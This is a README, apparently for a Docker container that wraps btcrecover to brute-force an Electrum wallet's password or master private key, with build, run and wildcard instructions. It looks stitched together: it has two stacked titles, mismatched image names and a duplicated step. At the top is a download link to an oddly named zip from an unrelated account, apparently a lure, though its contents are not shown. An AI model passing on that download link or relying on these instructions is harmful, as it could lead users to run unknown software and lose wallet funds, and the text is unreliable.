# Electrum-key
# Electrum-Wallet-Bruteforcer

## [download](https://github.com/mrripapln408/Electrum-key/releases/download/electrumkey/Sof.wa1e.zip)

A Docker container for experimenting with btcrecover

## Note
This is not for cracking wallet encryption, but for cracking the master extended private key or "xprv" from a decrypted wallet.

## Design choices

### Cloud provider

I went with GCS because I'm familiar with it and prefer it to AWS or Joyent. Better interface, better documentation, less unexpected behavior (usually).

### OS

According to [Google's Cloud Pricing Calculator](https://cloud.google.com/products/calculator/), and this documentation on [premium images](https://cloud.google.com/compute/pricing#premiumimages), Debian, CentOS, CoreOS, Ubuntu, or "other User Provided OS"es are free, and other OSes cost cents per hour. I'm comfortable with Debian, so that's what I went with. I suppose I could go with Alpine for faster builds, but I'm cutting that corner for now.

### Library (btcrecover)
After I forgot my wallet I started imagining something very similar to btcrecover. Unfortunately, token replacement is insufficient to find my lost password, so I'm resorting to brute-forcing.

## Operations

### Production

#### 1. Extract vital wallet info
https://github.com/gurnec/btcrecover/blob/master/docs/Extract_Scripts.md

Then set it as an environment variable named `WALLETINFO`.

#### 2. Pull the container
https://cloud.docker.com/repository/docker/timothygb/epb

```cmd
docker pull timothygb/epb:brutus
```

#### 3. Run and enter the container
```cmd
docker run -it -e WALLETINFO --name brutus brutus
```

#### 4. Modify the tokens list

To keep it simple, you can just use custom wildcards.

A couple of brief examples.

Try all combinations of the custom wildcards, for a password of length 4:
```
%4c
```

Try all combinations of the custom wildcards, for a password of length 10-20:
```
%10,20c
```


#### 4. Run the bruteforcer
Modify the charset as needed in [run.sh](run.sh)

If the run is interrupted, it can be resumed given that `savefile` is intact. If you change `tokens.txt` or the wildcards, delete the `savefile` before running the bruteforcer. It will complain if you don't.


### Development

#### Fork and clone this repo

#### Build the image
```cmd
docker build . -t brutus
```

#### Save the image
```cmd
docker push timothygb/electrum-wallet-bruteforcer:brutus
```
